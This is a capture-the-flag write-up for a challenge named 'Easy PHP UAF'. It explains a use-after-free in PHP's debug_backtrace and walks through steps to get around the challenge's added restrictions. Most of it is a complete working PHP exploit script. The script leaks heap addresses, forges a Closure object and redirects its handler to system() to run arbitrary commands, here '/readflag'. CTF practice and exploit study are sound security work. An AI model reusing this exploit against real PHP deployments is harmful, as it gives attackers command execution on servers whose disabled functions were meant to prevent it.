[中文](./README_zh.md) [English](./README.md)

[docker](./PHP-UAF.tar.gz)

# Easy PHP UAF WriteUps

## WriteUp:
This challenge is based on this exploit: https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php , which use a bug in debug_backtrace() function to cause a use-after-free vulnerability. With this vulnerability, we can leak and write PHP memory.

To solve this challenge, you need some knowledge about PHP source and a little about Pwn.

I do something to increase the difficulty of this challenge:

1. blocked loop functionality in lex_scan
2. limit recursion depth in extension
3. blocked strlen()

If you use gdb to debug and find out how the original exploit works, you will find that solution is so easy:

1. UAF, you can use the original exploit
2. leak the head point of next php heap, which can be used to compute the address of $helper and $abc
3. leak the address of Closure Object
4. write $helper -> a to make it a fake string which point to Closure Object
5. leak Closure Handlers from Closure Object and then compute the address of system
6. copy Closure Object to next php heap, change its address of internal_function.handler to system and write $helper -> b to make it point to this fake Closure Object
7. execute $helper -> b to execute system


## Exp:
```php
pwn("/readflag");

function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this -> a);
            $backtrace = (new Exception) -> getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    function str2int($str) {
        $address = 0;
        $address |= ord($str[4]);
        $address <<= 8;
        $address |= ord($str[5]);
        $address <<= 8;
        $address |= ord($str[6]);
        $address <<= 8;
        $address |= ord($str[7]);
        return $address;
    }
    function leak($offset) {
        global $abc;
        return strrev(substr($abc, $offset, 8));
    }
    function leakA($offset) {
        global $helper;
        return strrev(substr($helper -> a, $offset, 8));
    }
    function write($offset, $data) {
        global $abc;
        $abc[$offset] = $data[7];
        $abc[$offset + 1] = $data[6];
        $abc[$offset + 2] = $data[5];
        $abc[$offset + 3] = $data[4];
        $abc[$offset + 4] = $data[3];
        $abc[$offset + 5] = $data[2];
        $abc[$offset + 6] = $data[1];
        $abc[$offset + 7] = $data[0];
    }
    function trigger_uaf($arg) {
        $arg = str_repeat('A', 79);
        $vuln = new Vuln();
        $vuln -> a = $arg;
    }
    # UAF
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
    $helper = new Helper;
    $helper -> b = function ($x) { };
    # leak head point of next php heap
    $php_heap = leak(0x88);
    echo "PHP Heap: " . bin2hex($php_heap) . "\n";
    $abc_address = str2int($php_heap) - 0x88 - 0xa0;
    echo '$abc: ' . dechex($abc_address) . "\n";
    $closure_object = leak(0x20);
    echo "Closure Object: " . bin2hex($closure_object) . "\n";
    # let a point to closure_object
    write(0x10, substr($php_heap, 0, 4) . hex2bin(dechex(str2int($closure_object) - 0x28)));
    write(0x18, str_pad("\x06", 8, "\x00", STR_PAD_LEFT));
    # leak Closure Handlers
    $closure_handlers = leakA(0x28);
    echo "Closure Handlers: " . bin2hex($closure_handlers) . "\n";
    # compute system address
    $system_address = dechex(str2int($closure_handlers) - 10733946);
    echo "System: " . $system_address . "\n";
    # build fake closure_object
    write(0x90, leakA(0x10));
    write(0x90 + 0x08, leakA(0x18));
    write(0x90 + 0x10, leakA(0x20));
    write(0x90 + 0x18, leakA(0x28));
    $abc[0x90 + 0x38] = "\x01";
    write(0x90 + 0x68, substr($php_heap, 0, 4) . hex2bin($system_address));
    # let b get this object
    write(0x20, substr($php_heap, 0, 4) . hex2bin(dechex(str2int($php_heap) + 0x08 - 0xa0)));
    # eval system
    ($helper -> b)($cmd);
    exit();
}
```

